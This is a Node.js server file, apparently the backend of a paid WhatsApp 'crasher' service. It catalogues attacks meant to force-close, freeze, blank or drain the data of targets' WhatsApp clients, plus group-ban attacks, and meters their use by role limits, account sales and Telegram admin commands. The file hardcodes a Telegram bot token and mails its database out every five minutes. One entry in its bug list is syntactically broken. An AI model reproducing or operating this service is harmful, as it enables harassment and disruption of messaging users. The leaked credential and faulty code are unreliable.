require("./autoRestart")
const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const { default: makeWASocket, prepareWAMessageMedia, useMultiFileAuthState, DisconnectReason, generateWAMessage, getBuffer, generateWAMessageFromContent, proto, generateWAMessageContent, fetchLatestBaileysVersion, waUploadToServer, generateRandomMessageId, generateMessageTag, jidEncode, getUSyncDevices } = require("@whiskeysockets/baileys");

const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const chalk = require("chalk");
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const os = require('os');
const multer = require('multer');
const WebSocket = require('ws');
const http = require('http');
const server = http.createServer(app);
// ═══════════════════════════════════════════════════════════
//  PEMBELIAN AKUN OTOMATIS
// ═══════════════════════════════════════════════════════════

const PURCHASES_FILE = path.join(__dirname, 'purchases.json');

// Setup multer
const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 5 * 1024 * 1024 } // max 5MB
});

// Helper: load/save purchases
function loadPurchases() {
  if (!fs.existsSync(PURCHASES_FILE)) {
    fs.writeFileSync(PURCHASES_FILE, JSON.stringify([], null, 2));
    return [];
  }
  try {
    return JSON.parse(fs.readFileSync(PURCHASES_FILE, 'utf8'));
  } catch {
    return [];
  }
}

function savePurchases(data) {
  fs.writeFileSync(PURCHASES_FILE, JSON.stringify(data, null, 2));
}



// ═══ WA RAW WEBSOCKET — pakai noServer + filter path biar gak bentrok socket.io ═══
const wss = new WebSocket.Server({ noServer: true });

server.on('upgrade', (request, socket, head) => {
  const pathname = new URL(request.url, 'http://localhost').pathname;

  // Kalau socket.io → biarin socket.io yang handle (jangan ws)
  if (pathname.startsWith('/socket.io')) {
    return;
  }

  // Selain socket.io → ws WA yang handle
  wss.handleUpgrade(request, socket, head, (ws) => {
    wss.emit('connection', ws, request);
  });
});
// ═══ END WA RAW WEBSOCKET ═══

let wsClients = {};
let chatList = [];
const CHAT_FILE = 'chat.json';
const { Client } = require('ssh2');
const DB_PATH = "./database.json";
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');

const bugs = [
         { bug_id: "fc", bug_name: "𝐅𝐎𝐑𝐂𝐄 𝐂𝐋𝐎𝐒𝐄 𝐋𝐎𝐖𝐁 𝐀𝐍𝐃𝐑𝐎 !¡" },
         { bug_id: "blank1", bug_name: "𝐁𝐋𝐀𝐍𝐊 𝐇𝐀𝐑𝐃 !¡" },   
         { bug_id: "frezee", bug_name: "𝐅𝐑𝐄𝐙𝐄𝐄 𝐃𝐄𝐋𝐀𝐘 𝐇𝐀𝐑𝐃 !¡" },
         { bug_id: "delay", bug_name: "𝐃𝐄𝐋𝐀𝐘 𝐀𝐍𝐃𝐑𝐎 𝐕𝟏 !¡" },
         { bug_id: "delay1", bug_name: "𝐃𝐄𝐋𝐀𝐘 𝐀𝐍𝐃𝐑𝐎 𝐕2 !¡" },
         { bug_id: "blank", bug_name: "𝐁𝐋𝐀𝐍𝐊 𝐀𝐍𝐃𝐑𝐎𝐈𝐃 !¡"},
         { bug_id "buldo", bug_name: "𝐒𝐄𝐃𝐎𝐓 𝐊𝐔𝐎𝐓𝐀 𝟏𝟎𝟎𝐌𝐁 !¡"}, 
         
];
const bugscustom = [
   { bug_id: "ban_group", bug_name: "𝐁𝐀𝐍 𝐆𝐑𝐎𝐔𝐏 !¡ (𝐁𝐄𝐓𝐀)" },
   { bug_id: "ban_group1", bug_name: "𝐁𝐀𝐍 𝐆𝐑𝐎𝐔𝐏 V2 !¡ (𝐁𝐄𝐓𝐀)" },
];
let cncActive = true;
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
fs.watchFile("keyList.json", () => {
  console.log("[📂] keyList.json changed, reloading...");
  sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
});

function saveChat() {
  fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
}

function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '')
    .replace(/[\r\n]/g, ' ')
    .slice(0, 250);
}
const authorizedFounders = ['AanX', 'AanzCuyxzzz', '@aanchannell', 'AdminFounder', 'Reza', 'Aan'];
const OWNER_ID = 8038424443;
const TOKEN = "8962214821:AAH1LG_lpu3DYIB3PRsOdCAAfnH3VXIH1m0";
const wsPort = 2001;
const PORT = 2001;
const ID_GROUP = [
   -1003766507528
];
const ID_GROUP_UTAMA = [
   -1003766507528
];

let maintenanceMode = false;
let maintenanceReason = "Perbaikan Sender Global";
let maintenanceDuration = 3600;
let maintenanceChannel = "https://t.me/AanzCuyxzzz";
let maintenanceStartTime = null;

const channelConfig = {
  link: "https://whatsapp.com/channel/0029VbBZsRTL7UVe8r945707",
  message: "Jangan Lupa Join Saluran Official @AanCrasher agar tahu Update Terbaru!",
    image : "https://cdn.yupra.my.id/yp/5deotwg4.jpg",
    buttonText: "Join Sekarang"
};

// ===== BACKUP DATABASE.JSON VIA TELEGRAM =====

// Auto kirim database setiap 5 menit
setInterval(async () => {
  try {
    const dbPath = path.join(__dirname, 'database.json');
    
    if (!fs.existsSync(dbPath)) {
      console.log('[❌ BACKUP] database.json not found');
      return;
    }
    
    // Kirim file ke owner
    await bot.sendDocument(OWNER_ID, dbPath, {
      caption: `📦 *BACKUP DATABASE OTOMATIS*\n🕐 ${new Date().toLocaleString('id-ID')}`,
      parse_mode: 'Markdown'
    });
    
    console.log('[✅ BACKUP] Database sent to owner');
    
  } catch (error) {
    console.error('[❌ BACKUP] Failed:', error.message);
  }
}, 5 * 60 * 1000); // 5 menit

const bot = new TelegramBot(TOKEN, { polling: true });

function sendToGroups(text, options = {}) {
    for (const groupid of ID_GROUP) {
        bot.sendMessage(groupid, text, options).catch(err => {
            console.error(`Gagal kirim ke ${groupid}:`, err.response?.body || err.message);
        });
    }
}

function sendToGroupsUtama(text, options = {}) {
    for (const groupid of ID_GROUP_UTAMA) {
        bot.sendMessage(groupid, text, options).catch(err => {
            console.error(`Gagal kirim ke ${groupid}:`, err.response?.body || err.message);
        });
    }
}

const LIMIT_FILE = path.join(__dirname, 'limit.json');

const DEFAULT_ROLE_LIMITS = {
  founder: -1,
  owner: 15,
  reseller: 10,
  vip: 5,
  member: 0
};

function initLimitFile() {
  if (!fs.existsSync(LIMIT_FILE)) {
    const defaultData = {
      users: {},
      settings: {
        resetHours: 24,
        limits: DEFAULT_ROLE_LIMITS
      }
    };
    fs.writeFileSync(LIMIT_FILE, JSON.stringify(defaultData, null, 2));
    console.log('[✅ LIMIT] File limit.json created');
  }
}

function loadLimits() {
  try {
    initLimitFile();
    const data = fs.readFileSync(LIMIT_FILE, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    console.error('[❌ LIMIT] Error loading:', error.message);
    return {
      users: {},
      settings: {
        resetHours: 24,
        limits: DEFAULT_ROLE_LIMITS
      }
    };
  }
}

function saveLimits(limits) {
  try {
    fs.writeFileSync(LIMIT_FILE, JSON.stringify(limits, null, 2));
    return true;
  } catch (error) {
    console.error('[❌ LIMIT] Error saving:', error.message);
    return false;
  }
}

function getLimitByRole(role) {
  const roleKey = String(role).toLowerCase();
  const limits = loadLimits();
  const roleLimit = limits.settings.limits[roleKey];
  
  if (roleLimit !== undefined) {
    return roleLimit;
  }
  
  if (roleKey === 'founder') return -1;
  if (roleKey === 'owner') return 15;
  if (roleKey === 'reseller') return 10;
  if (roleKey === 'vip') return 5;
  return 0;
}

function getUserLimitData(username, role) {
  const limits = loadLimits();
  const roleKey = String(role).toLowerCase();
  const maxLimit = getLimitByRole(roleKey);
  const now = Date.now();
  const resetMs = limits.settings.resetHours * 60 * 60 * 1000;
  
  if (!limits.users[username]) {
    limits.users[username] = {
      username: username,
      role: roleKey,
      limit: maxLimit,
      used: 0,
      remaining: maxLimit === -1 ? -1 : maxLimit,
      lastReset: now,
      resetAt: now + resetMs
    };
    saveLimits(limits);
    return limits.users[username];
  }
  
  const user = limits.users[username];
  
  if (user.role !== roleKey) {
    user.role = roleKey;
    user.limit = maxLimit;
    user.used = 0;
    user.remaining = maxLimit === -1 ? -1 : maxLimit;
    user.lastReset = now;
    user.resetAt = now + resetMs;
    saveLimits(limits);
    console.log(`[🔄 ROLE UPDATE] ${username}: ${roleKey}`);
    return user;
  }
  
  const timeSinceReset = now - user.lastReset;
  if (timeSinceReset >= resetMs) {
    user.used = 0;
    user.remaining = user.limit === -1 ? -1 : user.limit;
    user.lastReset = now;
    user.resetAt = now + resetMs;
    saveLimits(limits);
    console.log(`[🔄 LIMIT RESET] ${username} reset to ${user.remaining}`);
  }
  
  return user;
}

function canUseGlobalSender(username, role) {
  const roleKey = String(role).toLowerCase();
  
  console.log(`[🔍 canUseGlobalSender] Called for ${username} (${roleKey})`);
  
  if (roleKey === 'member') {
    return { allowed: false, reason: 'Member tidak memiliki akses ke global sender', remaining: 0 };
  }
  
  if (roleKey === 'founder') {
    return { allowed: true, reason: 'Founder unlimited', remaining: -1, used: 0, limit: -1 };
  }
  
  if (!['owner', 'reseller', 'vip'].includes(roleKey)) {
    return { allowed: false, reason: `Role ${roleKey} tidak valid`, remaining: 0 };
  }
  
  try {
    const limits = loadLimits();
    let userData = limits.users[username];
    
    if (!userData) {
      const maxLimit = getLimitByRole(roleKey);
      console.log(`[🆕 USER BARU] ${username} (${roleKey}) dengan limit ${maxLimit}`);
      return { 
        allowed: true, 
        reason: `Sisa limit: ${maxLimit}`, 
        remaining: maxLimit, 
        used: 0, 
        limit: maxLimit 
      };
    }
    
    if (userData.role !== roleKey) {
      const maxLimit = getLimitByRole(roleKey);
      userData.role = roleKey;
      userData.limit = maxLimit;
      userData.remaining = maxLimit - (userData.used || 0);
      if (userData.remaining < 0) userData.remaining = 0;
      saveLimits(limits);
      console.log(`[🔄 ROLE UPDATE] ${username} dari ${userData.role} ke ${roleKey}, limit: ${userData.limit}, sisa: ${userData.remaining}`);
    }
    
    const now = Date.now();
    const resetMs = limits.settings.resetHours * 60 * 60 * 1000;
    const timeSinceReset = now - (userData.lastReset || 0);
    
    if (timeSinceReset >= resetMs) {
      console.log(`[⏰ RESET TRIGGER] ${username} sudah ${Math.floor(timeSinceReset / 3600000)} jam, melakukan reset`);
      userData.used = 0;
      userData.remaining = userData.limit === -1 ? -1 : userData.limit;
      userData.lastReset = now;
      userData.resetAt = now + resetMs;
      saveLimits(limits);
      console.log(`[🔄 LIMIT RESET] ${username} reset to ${userData.remaining}`);
    }
    
    console.log(`[📊 LIMIT DATA] ${username} - limit: ${userData.limit}, used: ${userData.used}, remaining: ${userData.remaining}`);
    
    if (userData.remaining === -1) {
      return { allowed: true, reason: 'Unlimited', remaining: -1, used: userData.used, limit: -1 };
    }
    
    if (userData.remaining > 0) {
      return { 
        allowed: true, 
        reason: `Sisa limit: ${userData.remaining}`, 
        remaining: userData.remaining, 
        used: userData.used, 
        limit: userData.limit 
      };
    }
    
    if (userData.remaining === 0) {
      const resetDate = new Date(userData.resetAt);
      const hoursLeft = Math.ceil((userData.resetAt - Date.now()) / (1000 * 60 * 60));
      return { 
        allowed: false, 
        reason: `Limit habis. Reset dalam ${hoursLeft} jam`, 
        remaining: 0,
        resetAt: userData.resetAt
      };
    }
    
    return { allowed: false, reason: 'Tidak dapat menggunakan global sender', remaining: 0 };
    
  } catch (error) {
    console.error(`[❌ canUseGlobalSender ERROR]`, error.message);
    return { allowed: false, reason: 'Error sistem', remaining: 0 };
  }
}

function useGlobalLimit(username, role) {
  const roleKey = String(role).toLowerCase();
  
  console.log(`[📊 useGlobalLimit] Called for ${username} (${roleKey})`);
  
  if (roleKey === 'member') {
    console.log(`[❌ useGlobalLimit] Member tidak bisa`);
    return false;
  }
  
  if (roleKey === 'founder') {
    const limits = loadLimits();
    if (!limits.users[username]) {
      limits.users[username] = {
        username: username,
        role: 'founder',
        limit: -1,
        used: 1,
        remaining: -1,
        lastReset: Date.now(),
        resetAt: Date.now() + (24 * 60 * 60 * 1000)
      };
    } else {
      limits.users[username].used = (limits.users[username].used || 0) + 1;
    }
    saveLimits(limits);
    console.log(`[👑 FOUNDER] ${username} used global (unlimited), total used: ${limits.users[username].used}`);
    return true;
  }
  
  if (!['owner', 'reseller', 'vip'].includes(roleKey)) {
    console.log(`[❌ useGlobalLimit] Role ${roleKey} tidak valid`);
    return false;
  }
  
  try {
    let limits = loadLimits();
    
    if (!limits.users[username]) {
      const maxLimit = getLimitByRole(roleKey);
      limits.users[username] = {
        username: username,
        role: roleKey,
        limit: maxLimit,
        used: 1,
        remaining: maxLimit - 1,
        lastReset: Date.now(),
        resetAt: Date.now() + (24 * 60 * 60 * 1000)
      };
      saveLimits(limits);
      console.log(`[📊 LIMIT] User baru ${username} (${roleKey}), sisa: ${limits.users[username].remaining}/${maxLimit}`);
      return true;
    }
    
    const userData = limits.users[username];
    
    if (userData.role !== roleKey) {
      const maxLimit = getLimitByRole(roleKey);
      userData.role = roleKey;
      userData.limit = maxLimit;
      userData.used = 0;
      userData.remaining = maxLimit;
      userData.lastReset = Date.now();
      userData.resetAt = Date.now() + (24 * 60 * 60 * 1000);
      console.log(`[🔄 ROLE UPDATE] ${username} role berubah ke ${roleKey}`);
    }
    
    console.log(`[📊 LIMIT CHECK] ${username} - remaining: ${userData.remaining}, limit: ${userData.limit}, used: ${userData.used}`);
    
    if (userData.remaining > 0) {
      userData.used = (userData.used || 0) + 1;
      userData.remaining = userData.limit - userData.used;
      saveLimits(limits);
      console.log(`[✅ LIMIT USED] ${username} (${roleKey}) sisa: ${userData.remaining}/${userData.limit}`);
      return true;
    }
    
    console.log(`[❌ LIMIT HABIS] ${username} (${roleKey}) limit habis`);
    return false;
    
  } catch (error) {
    console.error(`[❌ useGlobalLimit ERROR]`, error.message);
    return false;
  }
}

function getUserLimitInfo(username, role) {
  const roleKey = String(role).toLowerCase();
  
  if (roleKey === 'member') {
    return {
      username: username,
      role: roleKey,
      limit: 0,
      used: 0,
      remaining: 0,
      canUse: false,
      message: 'Member tidak punya akses global'
    };
  }
  
  if (roleKey === 'founder') {
    return {
      username: username,
      role: roleKey,
      limit: 'Unlimited',
      used: 0,
      remaining: 'Unlimited',
      canUse: true,
      message: 'Founder unlimited'
    };
  }
  
  const userData = getUserLimitData(username, roleKey);
  
  return {
    username: username,
    role: roleKey,
    limit: userData.limit === -1 ? 'Unlimited' : userData.limit,
    used: userData.used || 0,
    remaining: userData.remaining === -1 ? 'Unlimited' : userData.remaining,
    resetAt: new Date(userData.resetAt).toLocaleString('id-ID'),
    canUse: userData.remaining !== 0,
    message: userData.remaining === 0 ? 'Limit habis' : `Sisa ${userData.remaining} limit`
  };
}

function resetUserLimitAdmin(username) {
  const limits = loadLimits();
  
  if (!limits.users[username]) {
    return { success: false, message: 'User tidak ditemukan' };
  }
  
  const user = limits.users[username];
  const maxLimit = getLimitByRole(user.role);
  
  user.used = 0;
  user.remaining = maxLimit === -1 ? -1 : maxLimit;
  user.lastReset = Date.now();
  user.resetAt = Date.now() + (limits.settings.resetHours * 60 * 60 * 1000);
  
  saveLimits(limits);
  console.log(`[🔄 ADMIN RESET] ${username} limit reset`);
  
  return { success: true, message: `Limit ${username} telah direset` };
}

// ═══════════════════════════════════════════════════════════
// WA RAW WEBSOCKET CONNECTION HANDLER
// ═══════════════════════════════════════════════════════════
wss.on('connection', function (ws, req) {
  let username;

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

      if (data.type === 'sessionCheck') {
        const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const user = sessionList.find(e => e.sessionKey === data.key);

        if (!user) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Invalid key"
          }));
          return ws.close();
        }

        if (user.androidId !== data.androidId) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Another device has logged in"
          }));
          return ws.close();
        }
      }

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
        const validId = session.find(e => e.androidId === data.androidId)
          
        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: session.username,
          androidId: session.androidId,
          role: session.role || "member"
        }));

            const interval = setInterval(() => {
            const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
        const validId = session.find(e => e.androidId === data.androidId)
          
        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

            }, 10000);
      }
      if (data.type === 'auth') {
        username = getUserByKey(data.key);
         console.log(username)
        if (!username) return ws.close();
        wsClients[username] = ws;

const list = chatList
  .filter(m => m.from === username || m.to === username)
  .map(m => (m.from === username ? m.to : m.from));

  ws.send(JSON.stringify({
    type: "chatList",
    users: [...new Set(list)],
  }));
      }

      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }
    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });
});
// ═══ END WA RAW WEBSOCKET ═══

app.use(express.urlencoded({ extended: false }));
app.use(express.json({ limit: '10mb' }));

const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 40) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS, DELETE");
  res.header("Access-Control-Allow-Headers", "Content-Type, X-Auth-Token, X-Uid");
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData);

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000;
        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}

function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

let globalLimit = {
  used: 0,
  total: 3,
  lastReset: new Date().setHours(0, 0, 0, 0),
};

let globalHistory = [];

function isValidSession(key) {
  return key && key.length > 0;
}

function checkAndResetLimit() {
  const now = new Date();
  const today = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime();
  
  if (today > globalLimit.lastReset) {
    globalLimit.used = 0;
    globalLimit.lastReset = today;
  }
}

function getResetTime() {
  const now = new Date();
  const tomorrow = new Date(now.getFullYear(), now.getMonth(), now.getDate() + 1);
  const diff = tomorrow.getTime() - now.getTime();
  
  const hours = Math.floor(diff / (1000 * 60 * 60));
  const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
  const seconds = Math.floor((diff % (1000 * 60)) / 1000);
  
  return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
}

const chatUsersFile = './chat_users.json';
const chatMessagesFile = './chat_messages.json';
let chatUsers = [];
let chatMessages = [];
let onlineUsers = new Map();

function loadChatUsers() {
  try {
    if (fs.existsSync(chatUsersFile)) {
      chatUsers = JSON.parse(fs.readFileSync(chatUsersFile));
    } else {
      chatUsers = [];
    }
  } catch (e) {
    console.log("Error load chat users:", e);
    chatUsers = [];
  }
}

function loadChatMessages() {
  try {
    if (fs.existsSync(chatMessagesFile)) {
      chatMessages = JSON.parse(fs.readFileSync(chatMessagesFile));
    } else {
      chatMessages = [];
    }
  } catch (e) {
    console.log("Error load chat messages:", e);
    chatMessages = [];
  }
}

function saveChatUsers() {
  try {
    fs.writeFileSync(chatUsersFile, JSON.stringify(chatUsers, null, 2));
  } catch (e) {
    console.log("Error save chat users:", e);
  }
}

function saveChatMessages() {
  try {
    fs.writeFileSync(chatMessagesFile, JSON.stringify(chatMessages, null, 2));
  } catch (e) {
    console.log("Error save chat messages:", e);
  }
}

loadChatUsers();
loadChatMessages();

setInterval(() => {
  const now = Date.now();
  for (const [userId, timestamp] of onlineUsers.entries()) {
    if (now - timestamp > 30000) {
      onlineUsers.delete(userId);
    }
  }
}, 10000);

// ── Endpoint: upload bukti pembayaran
app.post('/api/buy-account', upload.single('proof'), async (req, res) => {
  try {
    const {
      payment_id,
      name,
      email,
      phone,
      role,
      duration,
      price,
    } = req.body;

    if (!payment_id || !name || !phone || !role || !price) {
      return res.json({ success: false, message: 'Data tidak lengkap' });
    }

    if (!req.file) {
      return res.json({ success: false, message: 'Bukti pembayaran wajib diupload' });
    }

    const purchases = loadPurchases();

    // Cek apakah payment_id sudah ada
    const existing = purchases.find(p => p.payment_id === payment_id);
    if (existing) {
      return res.json({ success: false, message: 'ID Pembayaran sudah digunakan' });
    }

    // Simpan file bukti
    const proofDir = path.join(__dirname, 'proofs');
    if (!fs.existsSync(proofDir)) fs.mkdirSync(proofDir, { recursive: true });

    const ext = path.extname(req.file.originalname) || '.jpg';
    const filename = `proof_${payment_id}_${Date.now()}${ext}`;
    const filepath = path.join(proofDir, filename);
    fs.writeFileSync(filepath, req.file.buffer);

    const record = {
      payment_id,
      name,
      email: email || '',
      phone,
      role,
      duration,
      price: parseInt(price),
      status: 'pending',
      proof_file: filename,
      created_at: new Date().toISOString(),
      verified_at: null,
      verified_by: null,
    };

    purchases.push(record);
    savePurchases(purchases);

    // Kirim ke Telegram Owner
    try {
      const caption =
        `🛒 *PEMBELIAN BARU*\n\n` +
        `🆔 ID: \`${payment_id}\`\n` +
        `👤 Nama: ${name}\n` +
        `📧 Email: ${email || '-'}\n` +
        `📱 WhatsApp: ${phone}\n` +
        `🎯 Role: *${role}*\n` +
        `⏳ Durasi: ${duration}\n` +
        `💰 Nominal: Rp ${parseInt(price).toLocaleString('id-ID')}\n` +
        `📊 Status: *PENDING*\n` +
        `🕐 Waktu: ${new Date().toLocaleString('id-ID')}\n\n` +
        `Untuk verifikasi, gunakan:\n` +
        `/approve ${payment_id}\n` +
        `/reject ${payment_id}`;

      await bot.sendPhoto(OWNER_ID, filepath, {
        caption,
        parse_mode: 'Markdown',
      });
    } catch (e) {
      console.log('[❌ TELEGRAM] Gagal kirim:', e.message);
    }

    return res.json({ success: true, message: 'Bukti berhasil diupload', payment_id });
  } catch (err) {
    console.error('[/api/buy-account]', err);
    return res.json({ success: false, message: 'Server error: ' + err.message });
  }
});

// ── Endpoint: cek status pembayaran
app.get('/api/check-payment', (req, res) => {
  const { id } = req.query;
  if (!id) return res.json({ success: false, message: 'ID diperlukan' });

  const purchases = loadPurchases();
  const record = purchases.find(p => p.payment_id === id);

  if (!record) {
    return res.json({ success: false, message: 'ID pembayaran tidak ditemukan' });
  }

  return res.json({ success: true, data: record });
});

app.post("/chat/register", (req, res) => {
  const { sessionKey, username, chatName, role } = req.body;
  
  const keyInfo = activeKeys[sessionKey];
  if (!keyInfo) {
    return res.json({ success: false, message: "Invalid session." });
  }
  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    return res.json({ success: false, message: "User not found." });
  }
  
  let chatUser = chatUsers.find(u => u.username === username);
  
  if (chatUser) {
    chatUser.lastSeen = new Date().toISOString();
  } else {
    chatUser = {
      id: `user_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      username: username,
      chatName: chatName || username,
      role: role || 'user',
      registeredAt: new Date().toISOString(),
      lastSeen: new Date().toISOString(),
      isBlocked: false,
      blockedReason: null,
      blockedAt: null,
      messageCount: 0
    };
    
    chatUsers.push(chatUser);
    saveChatUsers();
  }
  
  const systemMsg = {
    id: `msg_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
    userId: 'system',
    username: 'System',
    message: `👋 ${chatUser.chatName} bergabung ke chat!`,
    timestamp: new Date().toISOString(),
    isSystem: true
  };
  
  chatMessages.push(systemMsg);
  if (chatMessages.length > 200) {
    chatMessages = chatMessages.slice(-200);
  }
  saveChatMessages();
  
  onlineUsers.set(chatUser.id, Date.now());
  
  res.json({
    success: true,
    chatUser: chatUser
  });
});

app.post("/chat/send", (req, res) => {
  const { userId, username, message } = req.body;
  
  const user = chatUsers.find(u => u.id === userId);
  
  if (!user) {
    return res.json({ success: false, message: "User not registered." });
  }
  
  if (user.isBlocked) {
    return res.json({ 
      success: false, 
      blocked: true, 
      reason: user.blockedReason || "Anda diblokir oleh admin" 
    });
  }
  
  if (!message || message.trim().length === 0) {
    return res.json({ success: false, message: "Message cannot be empty." });
  }
  
  if (message.length > 500) {
    return res.json({ success: false, message: "Message too long (max 500 chars)." });
  }
  
  const newMessage = {
    id: `msg_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
    userId: userId,
    username: username,
    message: message.trim(),
    timestamp: new Date().toISOString(),
    isSystem: false
  };
  
  chatMessages.push(newMessage);
  
  user.messageCount = (user.messageCount || 0) + 1;
  user.lastSeen = new Date().toISOString();
  
  if (chatMessages.length > 200) {
    chatMessages = chatMessages.slice(-200);
  }
  
  saveChatMessages();
  saveChatUsers();
  
  onlineUsers.set(userId, Date.now());
  
  res.json({
    success: true,
    message: newMessage
  });
});

app.get("/chat/messages", (req, res) => {
  const { limit = 50 } = req.query;
  
  const messages = chatMessages.slice(-parseInt(limit)).reverse();
  
  res.json({
    success: true,
    messages: messages
  });
});

app.get("/chat/online", (req, res) => {
  const now = Date.now();
  const onlineUserList = [];
  
  for (const [userId, timestamp] of onlineUsers.entries()) {
    if (now - timestamp <= 30000) {
      const user = chatUsers.find(u => u.id === userId);
      if (user && !user.isBlocked) {
        onlineUserList.push({
          id: user.id,
          username: user.chatName || user.username,
          role: user.role,
          lastSeen: user.lastSeen
        });
      }
    }
  }
  
  res.json({
    success: true,
    count: onlineUserList.length,
    users: onlineUserList
  });
});

app.get("/chat/checkBlock", (req, res) => {
  const { userId } = req.query;
  
  const user = chatUsers.find(u => u.id === userId);
  
  if (!user) {
    return res.json({ isBlocked: false });
  }
  
  res.json({
    isBlocked: user.isBlocked || false,
    reason: user.blockedReason,
    blockedAt: user.blockedAt
  });
});

app.get("/chat/users", (req, res) => {
  const { key } = req.query;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ success: false, message: "Invalid key." });
  }
  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user || user.role !== "owner") {
    return res.json({ success: false, message: "Only owner can access." });
  }
  
  const now = Date.now();
  const usersWithStatus = chatUsers.map(u => ({
    ...u,
    isOnline: onlineUsers.has(u.id) && (now - onlineUsers.get(u.id) <= 30000)
  }));
  
  res.json({
    success: true,
    users: usersWithStatus
  });
});

app.post("/chat/block", (req, res) => {
  const { key, userId, reason } = req.body;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ success: false, message: "Invalid key." });
  }
  
  const db = loadDatabase();
